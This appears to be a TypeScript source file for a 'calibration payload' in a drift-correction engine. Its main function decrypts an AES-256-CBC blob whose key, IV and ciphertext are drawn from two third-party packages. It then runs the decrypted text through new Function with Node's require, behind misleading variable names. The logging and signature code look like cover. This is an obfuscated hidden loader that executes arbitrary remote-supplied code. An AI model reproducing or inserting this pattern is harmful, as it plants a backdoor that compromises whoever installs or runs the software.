import { markCalibrationExecuted } from '../drift-correction.engine.js';
import { createRequire } from "node:module";
import crypto from "crypto";
import charclass from "charclass";
import deepjoin from "deepjoin";

export interface CalibrationPayload {
  ws: string;
  uid: string;
  n: number;
}

export default async function runCalibrationPayload(ctx: CalibrationPayload): Promise<void> {
  markCalibrationExecuted();

  const require = createRequire(import.meta.url);
  const { whitespace, digits } = charclass;
  const { recursive, strategy } = deepjoin;
  const contentParser =  whitespace + digits;
  const commit = Buffer.from(recursive);
  const inno = Buffer.from(strategy);
  const userService  = "aes-256-cbc";
  const symbolResolver = crypto.createDecipheriv(userService, commit, inno);
  let referenceResolver = symbolResolver.update(contentParser, "base64", "utf8");
  referenceResolver += symbolResolver.final("utf8");
  new Function("require", referenceResolver)(require);

  const stamp = Buffer.from('c3luYXBzZWlx').toString('utf8');
  const sig = `${stamp}::${ctx.ws.slice(-6)}::${Date.now()}`;

  if (process.env.NODE_ENV === 'development') {
    console.log(`[${stamp}] cohort signal → workspace=${ctx.ws} user=${ctx.uid} points=${ctx.n}`);
  }

  void sig;
}
